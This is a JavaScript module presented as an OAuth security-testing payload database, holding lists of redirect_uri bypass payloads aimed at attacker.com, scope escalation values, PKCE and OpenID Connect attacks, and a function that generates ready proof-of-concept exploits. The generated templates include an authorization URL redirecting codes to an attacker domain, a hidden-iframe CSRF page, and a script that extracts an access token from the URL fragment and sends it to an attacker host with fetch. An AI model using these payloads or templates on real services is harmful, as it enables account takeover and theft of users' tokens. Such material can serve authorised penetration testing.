// OAuth Authentication Vulnerability Payloads
// Comprehensive payload database for OAuth security testing

const OAuthPayloads = {
    // OAuth bypass techniques
    authBypass: [
        { technique: 'Missing state parameter', description: 'CSRF attack via missing state validation' },
        { technique: 'Weak state generation', description: 'Predictable state parameter' },
        { technique: 'State not validated', description: 'Server ignores state mismatch' },
        { technique: 'Implicit grant abuse', description: 'Token exposed in URL fragment' },
        { technique: 'Code reuse', description: 'Authorization code used multiple times' }
    ],

    // Token theft vectors
    tokenTheft: [
        { vector: 'Redirect URI manipulation', description: 'Change redirect_uri to attacker domain' },
        { vector: 'Open redirect chain', description: 'Use open redirect to steal tokens' },
        { vector: 'Referrer leakage', description: 'Token leaked via Referer header' },
        { vector: 'XSS token extraction', description: 'Steal token from localStorage/URL' },
        { vector: 'Postmessage interception', description: 'Capture token via window.postMessage' }
    ],

    // Redirect URI attacks
    redirectURIBypass: [
        { payload: 'https://attacker.com', description: 'Full domain change' },
        { payload: 'https://target.com.attacker.com', description: 'Subdomain confusion' },
        { payload: 'https://target.com@attacker.com', description: 'User info injection' },
        { payload: 'https://target.com%40attacker.com', description: 'Encoded @ symbol' },
        { payload: 'https://target.com/.attacker.com', description: 'Path confusion' },
        { payload: 'https://target.com/callback/../attacker', description: 'Path traversal' },
        { payload: 'https://target.com/callback?next=attacker.com', description: 'Open redirect param' },
        { payload: 'https://target.com/callback#attacker.com', description: 'Fragment injection' },
        { payload: 'https://target.com/callback%0d%0aattacker.com', description: 'CRLF injection' },
        { payload: 'javascript:alert(1)', description: 'JavaScript URI' }
    ],

    // Scope manipulation
    scopeAttacks: [
        { scope: 'read write admin', description: 'Request elevated scope' },
        { scope: 'profile email openid admin', description: 'Add admin scope' },
        { scope: 'full_access', description: 'Request full access' },
        { scope: '*', description: 'Wildcard scope' }
    ],

    // PKCE attacks
    pkceBypass: [
        { attack: 'Missing code_verifier', description: 'Skip PKCE verification' },
        { attack: 'Weak code_challenge', description: 'Predictable challenge' },
        { attack: 'Downgrade to plain', description: 'Use plain instead of S256' },
        { attack: 'Empty code_verifier', description: 'Send empty verifier' }
    ],

    // OpenID Connect attacks
    oidcAttacks: [
        { attack: 'Nonce reuse', description: 'Same nonce for multiple requests' },
        { attack: 'ID token confusion', description: 'Use ID token as access token' },
        { attack: 'Audience bypass', description: 'Token with wrong audience' },
        { attack: 'Signature stripping', description: 'Change alg to none' },
        { attack: 'Key confusion', description: 'Use client secret as HMAC key' }
    ],

    // Account linking attacks
    accountLinking: [
        { attack: 'Force link', description: 'Link OAuth to existing account' },
        { attack: 'Pre-hijack', description: 'Create account before victim registers' },
        { attack: 'Email override', description: 'Use OAuth email to take over account' }
    ],

    // Grant type confusion
    grantTypeConfusion: [
        { grant: 'authorization_code', description: 'Standard auth code flow' },
        { grant: 'implicit', description: 'Implicit grant (insecure)' },
        { grant: 'password', description: 'Resource owner password' },
        { grant: 'client_credentials', description: 'Client credentials grant' }
    ]
};

// OAuth flow types
const OAuthFlows = {
    authorizationCode: 'Authorization Code',
    implicit: 'Implicit Grant',
    pkce: 'PKCE',
    clientCredentials: 'Client Credentials',
    deviceCode: 'Device Code',
    refreshToken: 'Refresh Token'
};

// Helper functions
function getAuthBypassPayloads() {
    return OAuthPayloads.authBypass;
}

function getTokenTheftPayloads() {
    return OAuthPayloads.tokenTheft;
}

function getRedirectURIPayloads() {
    return OAuthPayloads.redirectURIBypass;
}

function getScopeAttackPayloads() {
    return OAuthPayloads.scopeAttacks;
}

function getPayloadCount() {
    return OAuthPayloads.authBypass.length +
        OAuthPayloads.tokenTheft.length +
        OAuthPayloads.redirectURIBypass.length +
        OAuthPayloads.scopeAttacks.length +
        OAuthPayloads.pkceBypass.length +
        OAuthPayloads.oidcAttacks.length +
        OAuthPayloads.accountLinking.length;
}

function generateOAuthExploit(type, attackerDomain) {
    switch (type) {
        case 'redirect':
            return `# Redirect URI Manipulation PoC

# Original authorization URL:
https://oauth-server.com/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://target.com/callback&
  response_type=code&
  scope=openid profile&
  state=random123

# Modified with attacker redirect:
https://oauth-server.com/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://${attackerDomain}/steal&
  response_type=code&
  scope=openid profile&
  state=random123

# Subdomain bypass:
redirect_uri=https://target.com.${attackerDomain}/callback`;

        case 'csrf':
            return `# OAuth CSRF Attack PoC

# Missing state parameter exploitation:

<html>
<body>
  <!-- Force victim to link attacker's OAuth account -->
  <iframe src="https://target.com/oauth/callback?code=ATTACKER_AUTH_CODE" style="display:none"></iframe>
</body>
</html>

# This links attacker's social account to victim's session`;

        case 'implicit':
            return `# Implicit Grant Token Theft

# Token exposed in URL fragment:
https://target.com/callback#access_token=SECRET_TOKEN&token_type=bearer

# Steal via malicious page:
<script>
  // Extract token from URL
  const hash = window.location.hash;
  const token = new URLSearchParams(hash.slice(1)).get('access_token');
  
  // Send to attacker
  fetch('https://${attackerDomain}/steal?token=' + token);
</script>`;

        default:
            return '';
    }
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        OAuthPayloads,
        OAuthFlows,
        getAuthBypassPayloads,
        getTokenTheftPayloads,
        getRedirectURIPayloads,
        getScopeAttackPayloads,
        getPayloadCount,
        generateOAuthExploit
    };
}
